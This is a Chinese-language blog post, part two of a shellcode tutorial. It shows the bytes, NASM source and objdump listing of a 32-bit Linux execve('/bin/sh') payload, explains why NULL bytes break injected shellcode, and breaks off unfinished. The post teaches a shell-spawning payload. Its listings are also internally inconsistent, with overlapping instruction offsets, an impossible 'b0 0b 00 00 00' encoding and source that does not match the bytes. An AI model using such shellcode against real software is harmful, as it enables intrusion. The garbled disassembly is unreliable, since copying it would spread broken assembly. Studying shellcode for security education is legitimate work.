---
layout: post
title: "Shellcode 教程 0x02"
category: articles
tags: [shellcode, c, hacks]
image:
  feature: machine_panel.jpg
---

## 精准的失控
这是上一次我们写了 NASM 之后得到的machine code 然后写成的 shellcode。

{% highlight c %}
\xeb\x18\x5e\xb8\x00\x00\x00\x00\x89\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x00\x00\x00
\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
{% endhighlight %}

简单的来说上面的 shellcode 一定是不可行的，根本在 C 语言上运行不能。
因为

* shellcode 是要可注入的代码。

我们不能有 NULL, 何谓 NULL？就是“无”的状态。C 里面我们是用 "NULL" 或是 0 表示。而在汇编中会被编译成 0x00
所以当我们拿含有 NULL 的 shellcode 注入到软件的 string 里去的时候，指针就会在 NULL 的那点停止，后面的数据作废处理。

我们的 shellcode 必须要是
* 短小，可用
* 无 NULL
* 绝对位址

回到 NASM 代码来，重新设计过一次

{% highlight asm %}
section .text
global _start:
_start:
  jmp goto
  
shellcode:
  pop esi
  mov eax,0
  mov [esi+7], eax
  mov [esi+8], esi
  mov [esi+12], eax
  mov eax, 11
  lea ebx, [esi]
  lea ecx, [esi+7]
  lea edx, [esi+12]
  int 80h

goto:
  call shellcode
  db "/bin/sh"
{% endhighlight %}

还有对比编译后的

{% highlight bash %}
objdump -D shellcode.o

get_shell.o:     file format elf32-i386

Disassembly of section .text:

00000000 <shellcode-0x2>:
   0:   eb 18                   jmp    1a <goto>

00000002 <shellcode>:
   2:   5e                      pop    %esi
   3:   b8 00 00 00 00          mov    $0x0,%eax
   5:   89 46 07                mov    %eax,0x7(%esi)
   8:   89 76 08                mov    %esi,0x8(%esi)
   b:   89 46 0c                mov    %eax,0xc(%esi)
   e:   b0 0b 00 00 00          mov    $0xb,%eax
  10:   8d 1e                   lea    (%esi),%ebx
  12:   8d 4e 08                lea    0x8(%esi),%ecx
  15:   8d 56 0c                lea    0xc(%esi),%edx
  18:   cd 80                   int    $0x80

0000001a <goto>:
  1a:   e8 e3 ff ff ff          call   2 <shellcode>
  1f:   2f                      das    
  20:   62 69 6e                bound  %ebp,0x6e(%ecx)
  23:   2f                      das    
  24:   73 68                   jae    8e <goto+0x74>
{% endhighlight %}

## register 的结构,分配
![Register Memory]({{ site.url }}/images/register_memory.jpg)

拿 EAX 来做例子， EAX 是个 register, 可以用作 pointer, 在 32 bit 作业系统可容纳 4 bytes，因此我们的代码编译器会将 EAX 分配 4 bytes 的空位，用作存储数据。EAX 其实是 Extended AX。是 AX 的扩展版，EAX 由两个 AX 组成。而 16bit 的


< -待续---          Sunday 15 June 18:32 -->
